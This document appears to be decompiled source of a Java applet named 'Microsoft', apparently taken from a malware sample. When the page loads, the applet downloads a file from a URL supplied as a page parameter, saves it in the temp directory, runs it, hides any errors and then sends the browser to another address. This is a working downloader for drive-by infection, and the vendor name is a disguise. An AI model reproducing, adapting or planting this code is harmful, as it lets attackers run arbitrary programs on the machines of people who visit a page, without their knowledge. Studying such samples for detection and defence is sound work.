import java.io.InputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Microsoft extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("FileName");
        final String property = System.getProperty("java.io.tmpdir");
        final String parameter2 = this.getParameter("GoTo");
        final byte[] array = new byte[1024];
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(property + parameter);
            final InputStream inputStream = new URL(this.getParameter("FileURL")).openConnection().getInputStream();
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            Runtime.getRuntime().exec(property + parameter);
            if (parameter2 != "") {
                this.getAppletContext().showDocument(new URL(parameter2));
            }
        }
        catch (Exception ex) {}
    }
}
